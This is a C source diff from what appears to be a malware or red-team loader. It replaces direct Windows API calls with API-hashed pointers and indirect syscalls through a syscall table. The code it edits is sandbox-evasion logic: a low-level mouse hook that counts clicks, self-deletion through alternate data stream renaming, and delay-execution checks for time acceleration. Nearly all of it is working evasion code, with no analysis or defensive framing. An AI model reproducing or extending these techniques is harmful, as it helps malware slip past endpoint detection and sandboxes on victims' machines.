@@ -10,6 +10,7 @@ HHOOK g_hMouseHook = NULL;
 DWORD g_dwMouseClicks = NULL;
 
 extern VX_TABLE g_Sys;
+extern API_HASHING g_Api;
 
 // The callback function that will be executed whenever the user clicked a mouse button
 LRESULT CALLBACK HookEvent(INT nCode, WPARAM wParam, LPARAM lParam) {
@@ -21,7 +22,7 @@ LRESULT CALLBACK HookEvent(INT nCode, WPARAM wParam, LPARAM lParam) {
 		g_dwMouseClicks++;
 	}
 
-	return CallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
+	return g_Api.pCallNextHookEx(g_hMouseHook, nCode, wParam, lParam);
 }
 
 BOOL MouseClicksLogger() {
@@ -29,7 +30,7 @@ BOOL MouseClicksLogger() {
 	MSG 	Msg = { 0 };
 
 	// Installing hook
-	g_hMouseHook = SetWindowsHookExW(
+	g_hMouseHook = g_Api.pSetWindowsHookExW(
 		WH_MOUSE_LL,
 		(HOOKPROC)HookEvent,
 		NULL,
@@ -42,8 +43,8 @@ BOOL MouseClicksLogger() {
 	}
 
 	// Process unhandled events
-	while (GetMessageW(&Msg, NULL, NULL, NULL)) {
-		DefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
+	while (g_Api.pGetMessageW(&Msg, NULL, NULL, NULL)) {
+		g_Api.pDefWindowProcW(Msg.hwnd, Msg.message, Msg.wParam, Msg.lParam);
 	}
 
 	return TRUE;
@@ -81,7 +82,7 @@ BOOL DeleteSelf() {
 
 	//--------------------------------------------------------------------------------------------------------------------------
 	// Used to get the current file name
-	if (GetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
+	if (g_Api.pGetModuleFileNameW(NULL, szPath, MAX_PATH * 2) == 0) {
 #if DEBUG
 		PRINTA("[!] GetModuleFileNameW Failed With Error : %d \n", GetLastError());
 #endif
@@ -91,7 +92,7 @@ BOOL DeleteSelf() {
 	//--------------------------------------------------------------------------------------------------------------------------
 	// RENAMING
 	// Opening a handle to the current file
-	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE) {
 #if DEBUG
 		PRINTA("[!] CreateFileW [R] Failed With Error : %d \n", GetLastError());
@@ -103,7 +104,7 @@ BOOL DeleteSelf() {
 #endif
 
 	// Renaming the data stream
-	if (!SetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
+	if (!g_Api.pSetFileInformationByHandle(hFile, FileRenameInfo, pRename, sRename)) {
 #if DEBUG
 		PRINTA("[!] SetFileInformationByHandle [R] Failed With Error : %d \n", GetLastError());
 #endif
@@ -113,12 +114,13 @@ BOOL DeleteSelf() {
 	PRINTW(L"[+] DONE \n");
 #endif
 
-	CloseHandle(hFile);
+	ConfS(g_Sys.NtClose.wSystemCall);
+	RunSys(hFile);
 
 	//--------------------------------------------------------------------------------------------------------------------------
 	// DELETING
 	// Opening a new handle to the current file
-	hFile = CreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	hFile = g_Api.pCreateFileW(szPath, DELETE | SYNCHRONIZE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hFile == INVALID_HANDLE_VALUE && GetLastError() == ERROR_FILE_NOT_FOUND) {
 		// in case the file is already deleted
 		return TRUE;
@@ -135,7 +137,7 @@ BOOL DeleteSelf() {
 #endif
 
 	// Marking for deletion after the file's handle is closed
-	if (!SetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
+	if (!g_Api.pSetFileInformationByHandle(hFile, FileDispositionInfo, &Delete, sizeof(Delete))) {
 #if DEBUG
 		PRINTA("[!] SetFileInformationByHandle [D] Failed With Error : %d \n", GetLastError());
 #endif
@@ -145,7 +147,8 @@ BOOL DeleteSelf() {
 	PRINTW(L"[+] DONE \n");
 #endif
 
-	CloseHandle(hFile);
+	ConfS(g_Sys.NtClose.wSystemCall);
+	RunSys(hFile);
 
 	//--------------------------------------------------------------------------------------------------------------------------
 	// Freeing the allocated buffer
@@ -162,29 +165,25 @@ BOOL DelayExecutionVia_NtDE(FLOAT ftMinutes) {
 	LARGE_INTEGER           DelayInterval = { 0 };
 	LONGLONG                Delay = NULL;
 	NTSTATUS                STATUS = NULL;
-	fnNtDelayExecution      pNtDelayExecution = (fnNtDelayExecution)GetProcAddressH(GetModuleHandleH(NTDLLDLL_JOAA), NtDelayExecution_JOAA);
 	DWORD                   _T0 = NULL,
 		_T1 = NULL;
-
-#if DEBUG
-	PRINTA("[i] Delaying Execution Using \"NtDelayExecution\" For %0.3d Seconds", (dwMilliSeconds / 1000));
-#endif
 
 	// Converting from milliseconds to the 100-nanosecond - negative time interval
 	Delay = dwMilliSeconds * 10000;
 	DelayInterval.QuadPart = -Delay;
 
-	_T0 = GetTickCount64();
+	_T0 = g_Api.pGetTickCount64();
 
 	// Sleeping for 'dwMilliSeconds' ms
-	if ((STATUS = pNtDelayExecution(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
+	ConfS(g_Sys.NtDelayExecution.wSystemCall);
+	if ((STATUS = RunSys(FALSE, &DelayInterval)) != 0x00 && STATUS != STATUS_TIMEOUT) {
 #if DEBUG
 		PRINTA("[!] NtDelayExecution Failed With Error : 0x%0.8X \n", STATUS);
 #endif
 		return FALSE;
 	}
 
-	_T1 = GetTickCount64();
+	_T1 = g_Api.pGetTickCount64();
 
 	// Slept for at least 'dwMilliSeconds' ms, then 'DelayExecutionVia_NtDE' succeeded, otherwize it failed
 	if ((DWORD)(_T1 - _T0) < dwMilliSeconds)
@@ -209,11 +208,6 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds) {
 
 	Delay = dwMilliSeconds * 10000;
 	DelayInterval.QuadPart = -Delay;
-
-	// Self-deletion
-	if (!DeleteSelf()) {
-		// we dont care for the result - but you can change this if you want
-	}
 
 	// Try 10 times, after that return FALSE
 	while (i <= 10) {
@@ -249,7 +243,7 @@ BOOL AntiAnalysis(DWORD dwMilliSeconds) {
 		}
 
 		// Unhooking
-		if (g_hMouseHook && !UnhookWindowsHookEx(g_hMouseHook)) {
+		if (g_hMouseHook && !g_Api.pUnhookWindowsHookEx(g_hMouseHook)) {
 #if DEBUG
 			PRINTA("[!] UnhookWindowsHookEx Failed With Error : %d \n", GetLastError());
 #endif
